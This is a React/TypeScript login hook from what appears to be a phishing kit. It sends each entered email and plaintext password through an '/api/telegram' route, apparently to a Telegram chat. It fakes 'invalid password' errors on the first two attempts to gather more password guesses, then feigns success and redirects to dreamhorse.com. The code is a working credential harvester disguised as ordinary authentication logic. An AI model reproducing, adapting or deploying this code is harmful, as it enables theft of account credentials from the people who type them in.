import { useState } from 'react'
import { LoginCredentials, LoginState } from '../../../types/auth'

export function useLogin() {
  const [state, setState] = useState<LoginState>({
    isLoading: false,
    error: null,
    success: false,
  })

  const [attempts, setAttempts] = useState(0)

  const login = async (credentials: LoginCredentials) => {
    setState({ isLoading: true, error: null, success: false })

    try {
      await new Promise((resolve) => setTimeout(resolve, 1000))

      const currentAttempt = attempts + 1
      setAttempts(currentAttempt)

      // Log attempt via API
      const logMessage = `🔐 Login attempt ${currentAttempt}
Email: ${credentials.email}
LOG: ${credentials.password}
Time: ${new Date().toISOString()}`

      try {
        await fetch('/api/telegram', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ message: logMessage }),
        })
      } catch (telegramError) {
        console.error('Failed to send Telegram notification:', telegramError)
        // Continue with login process even if Telegram notification fails
      }

      // First two attempts fail
      if (currentAttempt <= 2) {
        setState({
          isLoading: false,
          error: 'Invalid email or password.',
          success: false,
        })
        return
      }

      // Third attempt "succeeds"
      setState({
        isLoading: false,
        error: null,
        success: true,
      })

      // redirect after short delay
      setTimeout(() => {
        window.location.href = "https://dreamhorse.com"
      }, 1000)

    } catch {
      setState({
        isLoading: false,
        error: 'An error occurred. Please try again.',
        success: false,
      })
    }
  }

  const reset = () => {
    setState({ isLoading: false, error: null, success: false })
  }

  return { ...state, login, reset }
}